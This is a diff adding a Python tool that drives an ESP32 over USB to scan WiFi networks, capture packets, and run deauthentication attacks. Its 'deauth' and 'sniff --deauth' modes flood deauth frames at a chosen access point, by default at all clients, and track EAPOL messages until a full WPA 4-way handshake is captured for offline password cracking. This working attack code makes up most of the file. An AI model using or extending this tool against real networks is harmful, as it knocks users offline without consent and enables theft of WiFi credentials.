@@ -1,0 +1,550 @@
+#!/bin/python3
+"""
+esp32_wifi_tool.py — Clean Separation (Pure Deauth vs Sniff)
+"""
+
+import os, sys, time, argparse, traceback, subprocess, threading, struct, re
+
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+DATA_DIR = os.path.join(BASE_DIR, "data")
+LOG_FILE = os.path.join(DATA_DIR, "wifi_tool.log")
+os.makedirs(DATA_DIR, exist_ok=True)
+
+IS_CHILD = "TERMUX_USB_FD" in os.environ
+
+if not IS_CHILD:
+    with open(LOG_FILE, "w") as f:
+        f.write(f"=== Log Started - {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n")
+
+
+class C:
+    RESET   = '\033[0m'
+    BOLD    = '\033[1m'
+    GREEN   = '\033[92m'
+    BLUE    = '\033[94m'
+    CYAN    = '\033[96m'
+    YELLOW  = '\033[93m'
+    RED     = '\033[91m'
+    MAGENTA = '\033[95m'
+    GRAY    = '\033[90m'
+
+_LEVELS = {
+    "info":  ("[*]", C.CYAN),
+    "ok":    ("[+]", C.GREEN),
+    "warn":  ("[!]", C.YELLOW),
+    "err":   ("[x]", C.RED),
+    "plain": ("", C.RESET),
+}
+
+def log(msg: str, color=None, level: str = "info"):
+    tag, default_color = _LEVELS.get(level, _LEVELS["info"])
+    color = color or default_color
+    ts = time.strftime("%H:%M:%S")
+    prefix = f"{tag}{C.RESET} " if tag else f"[{ts}] "
+    entry = f"{prefix}{msg}"
+    colored_entry = f"{color}{entry}{C.RESET}"
+
+    if not IS_CHILD:
+        print(colored_entry, file=sys.stderr, flush=True)
+
+    with open(LOG_FILE, "a") as f:
+        f.write(colored_entry + "\n")
+
+
+def tail_log(proc):
+    try:
+        with open(LOG_FILE, "r") as f:
+            f.seek(0, 2)
+            while proc.poll() is None:
+                line = f.readline()
+                if line:
+                    stripped = line.strip()
+                    if stripped and "=== Log Started" not in stripped:
+                        print(line, end="", flush=True)
+                else:
+                    time.sleep(0.05)
+            for line in f:
+                stripped = line.strip()
+                if stripped and "=== Log Started" not in stripped:
+                    print(line, end="", flush=True)
+    except Exception:
+        pass
+
+
+def bootstrap(subcommand: str, extra_args: list[str]) -> None:
+    from usb_device import auto_detect_device, request_permission, launch_with_fd
+
+    try:
+        device_path = auto_detect_device()
+        print(
+            f"\033[0;92m[+]\033[0m Found device: \033[0;92m{device_path}\033[0m",
+            file=sys.stderr,
+        )
+    except RuntimeError as e:
+        print(f"\033[0;91m[!]\033[0m ERROR: {e}", file=sys.stderr)
+        sys.exit(1)
+
+    print("\033[0;96m[*]\033[0;93m Requesting USB permission...\033[0m\n")
+    print("─" * 70, file=sys.stderr)
+
+    granted = request_permission(device_path)
+    if not granted:
+        print(
+            "\033[0;91m[!]\033[0m Permission denied or timed out.",
+            file=sys.stderr,
+        )
+        sys.exit(1)
+
+    script = os.path.abspath(__file__)
+    cmd = f"python {script} {subcommand} {' '.join(extra_args)}"
+
+    def _tail(line: str) -> None:
+        print(line, end="", file=sys.stderr, flush=True)
+
+    child_pid, child_done, tail_thread = launch_with_fd(
+        cmd=cmd,
+        device_path=device_path,
+        log_file=LOG_FILE,
+        tail_fn=_tail,
+    )
+
+    try:
+        _, status = os.waitpid(child_pid, 0)
+        exit_code = os.waitstatus_to_exitcode(status)
+    except KeyboardInterrupt:
+        import signal
+        os.kill(child_pid, signal.SIGTERM)
+        _, status = os.waitpid(child_pid, 0)
+        exit_code = os.waitstatus_to_exitcode(status)
+
+    child_done.set()
+    tail_thread.join(timeout=2)
+
+    print(
+        f"\n\033[0;92m[+] \033[0mProcess finished (exit {exit_code}).",
+        file=sys.stderr,
+    )
+
+# ====================== HELPERS ======================
+def _setup_bridge(fd=None):
+    """
+    fd=None  → root backend: open the ESP32 directly via libusb
+                              (Nethunter / Termux:Root / sudo, uid 0)
+    fd=int   → termux backend: wrap the Android USB fd passed by termux-api
+                                (stock Termux, no-root)
+    Returns (device, rx, tx, proto) — same contract regardless of backend.
+    """
+    from usb_device import describe_device, get_cdc_endpoints, claim_device, reset_endpoint_toggles
+    from receiver import ReceiverThread
+    from sender import Sender
+    from protocol import Protocol
+
+    if fd is None:
+        # ── Root path ─────────────────────────────────────────────────────────
+        from usb_device import wrap_direct
+        log("Backend: \033[0;92mroot (direct libusb)\033[0m", C.GREEN)
+        device = wrap_direct()
+
+        try:
+            cfg = device.get_active_configuration()
+            for intf in cfg:
+                try:
+                    if device.is_kernel_driver_active(intf.bInterfaceNumber):
+                        device.detach_kernel_driver(intf.bInterfaceNumber)
+                except Exception:
+                    pass
+        except Exception:
+            pass
+    else:
+        from usb_device import wrap_fd
+        device = wrap_fd(fd)
+
+    log(f"Device: \033[0;92m{describe_device(device)}", C.BLUE)
+
+    ep_in, ep_out, intf = get_cdc_endpoints(device)
+    claim_device(device, intf)
+    reset_endpoint_toggles(device, ep_in, ep_out)
+
+    rx = ReceiverThread(device, ep_in, log_func=log)
+    rx.start()
+    tx = Sender(device, ep_out, log_func=log)
+    proto = Protocol(tx, rx)
+    proto.log = lambda x: None
+
+    return device, rx, tx, proto
+
+def _drain_stale(rx):
+    for _ in range(12):
+        rx.readline(timeout=0.08)
+
+
+def _wait_for_ready(rx):
+    for _ in range(15):
+        line = rx.readline(timeout=0.4)
+        if line and "READY" in line:
+            return True
+    return False
+
+
+# ====================== SCAN ======================
+def do_scan(fd: int = None):
+    log("=== WiFi Network Scan ===", C.CYAN)
+    _, rx, tx, proto = _setup_bridge(fd)
+    networks = []
+
+    def on_event(ev):
+        if ev and ev.get("type") == "scan_ap":
+            networks.append(ev)
+
+    proto.on_event = on_event
+
+    _drain_stale(rx)
+    _wait_for_ready(rx)
+    proto.start()
+
+    resp = proto.send_cmd("SCAN_WIFI", timeout=25)
+    
+    if resp and resp.get("ok"):
+        status_str = "OK"
+        msg_str = resp.get("msg", "wireless network scan initialized")
+        log(f"ESP32-S3: {status_str}, {msg_str}", C.YELLOW)
+    else:
+        status_str = "FAILED"
+        msg_str = resp.get("msg", "internal radio transceiver scanning failure")
+        log(f"ESP32-S3: {status_str}, {msg_str}", C.RED, level="err")
+
+    time.sleep(1)
+    proto.stop()
+    rx.stop()
+    rx.join(timeout=3)
+
+    if not networks:
+        log("No networks found.", level="warn")
+        return
+
+    networks.sort(key=lambda n: n.get("rssi", -999), reverse=True)
+
+    # NOTE: bare print() here was unreliable — stdout is redirected to a
+    # file (not a TTY) in the child process, so Python block-buffers it.
+    # Without an explicit flush, these lines could still be sitting in the
+    # buffer when the process exits, and tail_log() never sees them.
+    # flush=True on every print forces each line out immediately.
+    print("\n" + "=" * 90, file=sys.stderr, flush=True)
+    print(f"{'SSID':<30} {'BSSID':<18} {'CH':>3} {'RSSI':>6}  SECURITY", file=sys.stderr, flush=True)
+    print("-" * 90, file=sys.stderr, flush=True)
+
+    for n in networks:
+        ssid  = (n.get("ssid") or "(hidden)")[:29]
+        rssi  = n.get("rssi", 0)
+        color = C.GREEN if rssi > -65 else C.YELLOW if rssi > -80 else C.RED
+        print(f"{color}{ssid:<30} {n.get('bssid',''):<18} {n.get('channel',''):>3}  "
+              f"{rssi:>6}  {n.get('security','')}{C.RESET}", file=sys.stderr, flush=True)
+
+    print(f"\n{len(networks)} networks found.\n", file=sys.stderr, flush=True)
+
+
+# ====================== SNIFF (with optional deauth) ======================
+def do_sniff(fd: int = None, args=None):
+    from pcap_writer import PcapWriter
+    log("=== Packet Sniffer ===", C.CYAN)
+    _, rx, tx, proto = _setup_bridge(fd)
+
+    out_path = args.output or os.path.join(DATA_DIR, f"capture_{int(time.time())}.pcap")
+
+    if out_path != "-":
+        log(f"Initializing PCAP storage target → {out_path}", C.BLUE)
+    else:
+        log("Streaming live binary PCAP payload straight to stdout...", C.BLUE)
+
+    writer = PcapWriter(out_path, stream_mode=args.stream)
+    packet_count = 0
+
+    # Clean EAPOL 4-Way Handshake tracking matrix
+    handshake_state = {"M1": False, "M2": False, "M3": False, "M4": False}
+    stop_sniff_event = threading.Event()
+
+    def parse_eapol_message(payload: bytes):
+        """
+        Dynamically strips variable-length Radiotap headers, unmasks 
+        802.11 frame offsets, and detects structural EAPOL key layers.
+        """
+        try:
+            if len(payload) < 4:
+                return
+
+            # 1. Dynamically parse and skip the Radiotap preamble layer
+            rt_len = struct.unpack("<H", payload[2:4])[0]
+            if len(payload) < rt_len + 34:
+                return
+
+            mac_base = rt_len
+            fc0 = payload[mac_base]
+            type_val = (fc0 & 0x0C) >> 2
+            
+            # Restrict parsing exclusively to 802.11 Data Frames (Type 2)
+            if type_val != 2:
+                return
+
+            # 2. Account for dynamic MAC header length variants (To-DS / From-DS flags)
+            to_ds = (payload[mac_base + 1] & 0x01)
+            from_ds = (payload[mac_base + 1] & 0x02) >> 1
+            
+            hdr_len = 24
+            if to_ds and from_ds:
+                hdr_len = 30  # Bridge architecture spans 4 address blocks
+
+            # Accommodate 802.11e Quality of Service (QoS Data) subtitle extensions
+            subtype = (fc0 & 0xF0) >> 4
+            if subtype in [8, 9, 10, 11]:
+                hdr_len += 2
+
+            # 3. Scan the payload segment window dynamically to find the LLC EtherType hook
+            # This shields the analyzer from variations in frame padding alignment
+            llc_base = mac_base + hdr_len
+            search_window = payload[llc_base : llc_base + 12]
+            
+            if b'\x88\x8E' in search_window:
+                # Calculate exactly where the EtherType token resides inside the data slice
+                eth_idx = llc_base + search_window.index(b'\x88\x8E')
+                eapol_start = eth_idx + 2
+                
+                if len(payload) < eapol_start + 6:
+                    return
+
+                packet_type = payload[eapol_start + 1]
+                # Accept both standard RFC mappings for EAPOL-Key frames (1 or 3)
+                if packet_type in [1, 3]:
+                    key_info = payload[eapol_start + 5 : eapol_start + 7]
+                    k_flags = (key_info[0] << 8) | key_info[1]
+                    
+                    # Apply standard IEEE 802.11i cryptographic flag definitions
+                    is_pairwise = bool(k_flags & (1 << 3))
+                    is_ack      = bool(k_flags & (1 << 7))
+                    is_mic      = bool(k_flags & (1 << 8))
+                    is_secure   = bool(k_flags & (1 << 9))
+                    is_error    = bool(k_flags & (1 << 10))
+                    
+                    if is_pairwise and not is_error:
+                        if is_ack and not is_mic:
+                            if not handshake_state["M1"]:
+                                handshake_state["M1"] = True
+                                log("[EAPOL OK] Handshake Message M1...", C.GREEN, level="ok")
+                        elif not is_ack and is_mic and not is_secure:
+                            if handshake_state["M1"] and not handshake_state["M2"]:
+                                handshake_state["M2"] = True
+                                log("[EAPOL OK] Handshake Message M2...", C.GREEN, level="ok")
+                        elif is_ack and is_mic and is_secure:
+                            if handshake_state["M2"] and not handshake_state["M3"]:
+                                handshake_state["M3"] = True
+                                log("[EAPOL OK] Handshake Message M3...", C.GREEN, level="ok")
+                        elif not is_ack and is_mic and is_secure:
+                            if handshake_state["M3"] and not handshake_state["M4"]:
+                                handshake_state["M4"] = True
+                                log("[EAPOL OK] Handshake Message M4...", C.GREEN, level="ok")
+
+        except Exception as err:
+            log(f"Parser error: {err}", C.RED, level="err")
+
+    def on_pcap(payload, _):
+        nonlocal packet_count
+        writer.write_packet(payload)
+        packet_count += 1
+        
+        parse_eapol_message(payload)
+
+        if not args.eapol_only:
+            if packet_count % 40 == 0 or packet_count <= 8:
+                log(f"Captured {packet_count} packets...", C.MAGENTA)
+
+        if args.eapol_only and args.bssid:
+            if handshake_state["M1"] and handshake_state["M2"] and handshake_state["M3"] and handshake_state["M4"]:
+                log("\n[+] SUCCESS: Valid 4-Way Handshake captured successfully!", C.GREEN, level="ok")
+                stop_sniff_event.set() # Release the script holding lock
+
+    proto.on_pcap = on_pcap
+    _drain_stale(rx)
+    _wait_for_ready(rx)
+    proto.start()
+
+    # Optional Deauth trigger sequence optimization
+    if getattr(args, 'deauth', False) and args.bssid:
+        log(f"Pre-sending deauth targeting context {args.bssid}...", C.YELLOW)
+        deauth_args = {
+            "bssid": args.bssid,
+            "client": getattr(args, 'client', "FF:FF:FF:FF:FF:FF"),
+            "channel": args.channel,
+            "count": 150, 
+            "deauth_interval_ms": 100,
+            "reason": 7
+        }
+        proto.send_cmd("DEAUTH", deauth_args, timeout=18)
+
+    sniff_args = {"mode": "hop" if args.hop else "fixed"}
+    if args.hop:
+        sniff_args["interval_ms"] = args.interval
+    else:
+        sniff_args["channel"] = args.channel
+    if args.eapol_only:
+        sniff_args["eapol_only"] = True
+    if args.bssid:
+        sniff_args["bssid"] = args.bssid
+
+    resp = proto.send_cmd("START_SNIFF", sniff_args, timeout=12)
+    
+    if resp and resp.get("ok"):
+        status_str = "OK"
+        msg_str = resp.get("msg", "sniffing started")
+    else:
+        status_str = "FAILED"
+        msg_str = resp.get("msg", "unknown hardware rejection error")
+
+    log(f"ESP32: {status_str}, {msg_str}", C.YELLOW)
+
+    try:
+        mode_str = "hopping" if args.hop else f"channel {args.channel}"
+        log(f"Sniffing on {mode_str}... (Ctrl+C to bypass manually)", C.BOLD)
+        
+        while not stop_sniff_event.is_set():
+            stop_sniff_event.wait(timeout=0.2)
+            
+    except KeyboardInterrupt:
+        log("\nStopping capture via manual intervention request...", C.YELLOW)
+
+    proto.send_cmd("STOP_SNIFF", timeout=6)
+    writer.close()
+    proto.stop()
+    rx.stop()
+    rx.join(timeout=3)
+
+    log(f"\nCapture saved → {out_path} ({packet_count} packets)", C.GREEN)
+
+# ====================== PURE DEAUTH (No Capture) ======================
+def do_deauth(fd: int = None, args=None):
+    log("=== Pure Deauth Attack ===", C.CYAN)
+    log(f"Target BSSID: {args.bssid} | Channel: {args.channel} | Count: {args.count}", C.YELLOW)
+
+    device, rx, tx, proto = _setup_bridge(fd)
+
+    _drain_stale(rx)
+    _wait_for_ready(rx)
+
+    finished_evt = threading.Event()
+
+    def on_event(ev):
+        if ev and ev.get("type") == "deauth_stats":
+            log("\n[+] Telemetry Update from Firmware Stack:", C.BOLD, level="ok")
+            log(f"  Parsed BSSID   : {ev.get('bssid')}", C.GREEN, level="plain")
+            log(f"  Parsed Client  : {ev.get('client')}", C.GREEN, level="plain")
+            log(f"  Active Channel : {ev.get('channel')}", C.GREEN, level="plain")
+            log(f"  Configured Loop: Count={ev.get('count')} | Interval={ev.get('interval_ms')}ms | Reason={ev.get('reason')}", C.GREEN, level="plain")
+            log(f"  Frames Injected: {ev.get('sent_frames')}", C.GREEN, level="plain")
+            
+            if ev.get("status") == "finished":
+                finished_evt.set()  # Signal that we received the final completion packet
+
+    proto.on_event = on_event
+    proto.start()
+
+    dc_args = {
+        "bssid": str(args.bssid),
+        "client": str(args.client),
+        "channel": int(args.channel),
+        "count": int(args.count),
+        "deauth_interval_ms": int(args.interval),
+        "reason": 7
+    }
+
+    resp = proto.send_cmd("DEAUTH", dc_args, timeout=45)
+    
+    if resp and resp.get("ok"):
+        status_str = "OK"
+        msg_str = resp.get("msg", "injection loop initialized")
+        log(f"ESP32-S3: {status_str}, {msg_str}", C.YELLOW)
+        
+        log("Injection loop running on hardware. Waiting for telemetry report...", C.CYAN)
+        if not finished_evt.wait(timeout=30):
+            log("Telemetry timed out before finishing packet collection.", level="warn")
+    else:
+        status_str = "FAILED"
+        msg_str = resp.get("msg", "hardware rejected configuration payload")
+        log(f"ESP32-S3: {status_str}, {msg_str}", C.RED, level="err")
+
+    proto.stop()
+    rx.stop()
+    rx.join(timeout=3)
+
+    log("Deauth attack completed.", C.GREEN)
+
+# ====================== MAIN ======================
+def main():
+    parser = argparse.ArgumentParser(description="ESP32 WiFi Tool")
+    subparsers = parser.add_subparsers(dest="command", required=True)
+
+    subparsers.add_parser("scan", help="Scan nearby WiFi networks")
+
+    # Sniff command
+    sniff_p = subparsers.add_parser("sniff", help="Packet sniffing (with optional deauth)")
+    sniff_p.add_argument("--channel", type=int, default=1)
+    sniff_p.add_argument("--hop", action="store_true")
+    sniff_p.add_argument("--interval", type=int, default=300)
+    sniff_p.add_argument("--eapol-only", action="store_true")
+    sniff_p.add_argument("--bssid")
+    sniff_p.add_argument("--client", default="FF:FF:FF:FF:FF:FF")
+    sniff_p.add_argument("--deauth", action="store_true", help="Send deauth before sniffing")
+    sniff_p.add_argument("-o", "--output")
+    sniff_p.add_argument("--stream", action="store_true", help="Enable immediate packet streaming for live tailing")
+
+    # Pure deauth command
+    deauth_p = subparsers.add_parser("deauth", help="Pure deauth (no capture)")
+    deauth_p.add_argument("--bssid", required=True)
+    deauth_p.add_argument("--channel", type=int, required=True)
+    deauth_p.add_argument("--client", default="FF:FF:FF:FF:FF:FF")
+    deauth_p.add_argument("--count", type=int, default=20)
+    deauth_p.add_argument("--interval", type=int, default=180)
+    
+
+    args = parser.parse_args()
+
+    from usb_device import detect_backend
+    print("\033[0;92m[+]\033[0m NRcap32 v1.0 - @7wp81x")
+    try:
+        backend = detect_backend()
+    except RuntimeError as e:
+        print(f"\033[0;91m[!]\033[0m {e}", file=sys.stderr)
+        sys.exit(1)
+
+    fd_str = os.environ.get("TERMUX_USB_FD")
+
+    if backend == "root":
+        if args.command == "scan":
+            do_scan()
+        elif args.command == "sniff":
+            do_sniff(args=args)
+        elif args.command == "deauth":
+            do_deauth(args=args)
+
+    elif fd_str is None:
+        print(
+            "\033[0;93m[*]\033[0m Backend: \033[0;93mtermux-api (no-root)\033[0m",
+            file=sys.stderr,
+        )
+        bootstrap(args.command, sys.argv[2:])
+
+    else:
+        # ── Termux child process (TERMUX_USB_FD already set) ─────────────────
+        fd = int(fd_str)
+        if args.command == "scan":
+            do_scan(fd=fd)
+        elif args.command == "sniff":
+            do_sniff(fd=fd, args=args)
+        elif args.command == "deauth":
+            do_deauth(fd=fd, args=args)
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except Exception:
+        with open(LOG_FILE, "a") as f:
+            f.write(traceback.format_exc())
+        raise
